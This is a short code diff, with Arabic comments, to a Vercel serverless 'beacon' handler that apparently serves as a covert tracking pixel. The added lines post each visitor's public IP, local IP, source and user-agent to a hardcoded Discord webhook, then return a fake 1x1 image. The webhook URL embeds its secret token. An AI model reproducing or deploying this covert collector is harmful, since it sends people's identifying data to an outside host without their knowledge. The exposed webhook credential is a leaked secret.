@@ -6,11 +6,22 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   const source = req.query.source || "unknown";
   const localIP = req.query.local_ip || "N/A";
 
-  console.log(`[BEACON] Source: ${source}`);
-  console.log(`  🌐 Public IP: ${publicIP}`);
-  console.log(`  🖥️ Local IP: ${localIP}`);
-  console.log(`  📱 User-Agent: ${userAgent}`);
+  // ✅ إرسال إشعار إلى Discord Webhook
+  const webhookUrl = "https://discord.com/api/webhooks/1385313073564225576/lwmGqBlY6YyilEQvxo7fcgguhQ6xYLDtLTUupDV2FJjSoIPPlqdDXgcxQocek2ZElUK1"; // ← حط رابطك هنا
 
+  const content = `📡 **Beacon Detected**
+> 🌐 **Public IP:** ${publicIP}
+> 🖥️ **Local IP:** ${localIP}
+> 📍 **Source:** ${source}
+> 🧭 **User-Agent:** \`${userAgent}\``;
+
+  await fetch(webhookUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content }),
+  });
+
+  // إرسال بيكسل وهمي (كما هو)
   const pixel = Buffer.from(
     "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAokB9AcPjGgAAAAASUVORK5CYII=",
     "base64"
